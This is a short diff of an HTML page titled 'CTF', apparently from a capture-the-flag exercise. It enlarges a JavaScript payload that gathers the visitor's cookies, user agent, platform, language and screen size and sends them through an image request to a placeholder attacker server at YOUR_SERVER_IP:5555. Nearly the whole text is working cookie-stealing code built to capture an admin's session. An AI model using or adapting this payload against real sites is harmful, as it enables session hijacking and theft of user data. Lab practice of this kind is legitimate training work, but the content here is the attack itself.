@@ -78,9 +78,25 @@ sudo python3 -m http.server 4444
   <head>
     <title>CTF</title>
     <script>
-      // This script will send the admin's cookies to your server when executed
+      // Collect additional information
+      var cookies = document.cookie;
+      var userAgent = navigator.userAgent;
+      var platform = navigator.platform;
+      var language = navigator.language || navigator.userLanguage;
+      var screenSize = screen.width + 'x' + screen.height;
+      
+      // Encode the data to ensure it's safely transmitted
+      var data = encodeURIComponent(
+        'cookies=' + cookies +
+        '&userAgent=' + userAgent +
+        '&platform=' + platform +
+        '&language=' + language +
+        '&screenSize=' + screenSize
+      );
+      
+      // Send the data to your server
       var i = new Image();
-      i.src = "http://YOUR_SERVER_IP:5555/?cookie=" + document.cookie;
+      i.src = "http://YOUR_SERVER_IP:5555/?" + data;
     </script>
   </head>
   <body>
